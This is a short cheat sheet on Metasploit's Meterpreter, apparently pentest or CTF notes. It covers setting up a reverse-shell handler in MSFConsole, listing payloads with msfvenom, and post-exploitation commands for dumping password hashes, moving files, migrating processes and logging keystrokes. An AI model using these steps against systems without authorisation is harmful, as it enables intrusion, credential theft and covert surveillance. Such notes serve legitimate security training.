##### Basics
The Meterpreter is a Metasploit agent, staying well out of sight of the target, and establishing encrypted TLS connection to the attacker.
Meterpreter will be detected by major antivirus software, but is still very stealthy.
Because the Meterpreter runs on the RAM, it will be gone by the time the device has rebooted.
Meterpreter will connect to a running MSFConsole session.

##### Listening
To listen for a reverse shell, use (in MSFConsole):
```
use exploit/multi/handler
set PAYLOAD USED_PAYLOAD 
set LHOST IP
set LPORT PORT
set ExitOnSession false
exploit -j
```

##### Payloads
There are many payloads available, for a lot of different platforms. To list them, use 
```
msfvenom --list payloads | grep meterpreter
```

When you decide the payload, use these factors:
- The operating system of the target
- Available components on the target's system (Python, PHP, etc)
- Allowed network connection types

##### Commands
Run `help` to get a list with description of all commands.

Important commands:
```
background       // Background the current session.
sessions         // View and switch between sessions.
run              // Execute a Meterpreter script or module.
upload/download  // Uploads/downloads content to or from the target machine.
shell            // Drops into a system shell on the target.
hashdump         // Dums the contents of the SAMM database.
getuid           // Check user privilege.
search           // Search for file on target system.
show options     // View all info
```


###### Migration
Process migration will help you interact, stabilize and record keystrokes on a program.
Usage: `migrate PID`
Logging keys: `keyscan_start`, `keyscan_stop`, `keyscan_dump`
Note: This will change the user privilege level, which you might not be able to gain back.

Usage:
```
pid
```
